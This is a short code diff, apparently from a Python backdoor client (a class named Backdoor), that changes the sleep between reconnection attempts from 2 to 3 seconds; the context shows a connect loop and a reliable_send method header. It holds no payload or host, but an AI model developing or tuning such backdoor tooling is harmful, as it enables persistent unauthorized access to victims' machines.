@@ -31,7 +31,7 @@ class Backdoor:
 					self.connected = True
 					print("[+] Connected")
 				except:
-					time.sleep(2)
+					time.sleep(3)
 
 
 	def reliable_send(self, data):
